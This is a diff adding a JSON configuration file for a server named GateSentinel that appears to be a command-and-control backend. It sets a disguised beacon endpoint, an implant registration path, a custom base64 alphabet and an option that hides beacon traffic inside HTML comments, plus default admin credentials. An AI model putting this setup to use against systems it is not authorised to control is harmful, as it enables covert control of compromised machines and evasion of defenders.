@@ -1,0 +1,37 @@
+{
+  "db_path": "./gatesentinel.db",
+  "admin_user": "admin",
+  "admin_pass": "admin123",
+  "client_token": "Demo",
+  "jwt_secret": "GateSentinel-JWT-Secret-Key-2025-Change-This-In-Production",
+  "webhook_url": "",
+  "webhook_key": "",
+  "webhook_enable": false,
+  "server": {
+    "cert_file": "./certs/server.crt",
+    "enable_https": true,
+    "host": "0.0.0.0",
+    "https_port": 8443,
+    "key_file": "./certs/server.key",
+    "max_body_size": 10,
+    "port": 8080,
+    "read_timeout": 60,
+    "write_timeout": 60
+  },
+  "routes": {
+    "admin_prefix": "/websafe/admin",
+    "api_prefix": "/websafe/admin/api",
+    "beacon_endpoint": "/api.jsp",
+    "login_path": "/login",
+    "register_path": "/sync_debug"
+  },
+  "encoding": {
+    "custom_base64_table": "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/",
+    "use_custom_base64": true
+  },
+  "traffic_disguise": {
+    "enable": true,
+    "prefix": "<!--",
+    "suffix": "-->"
+  }
+}
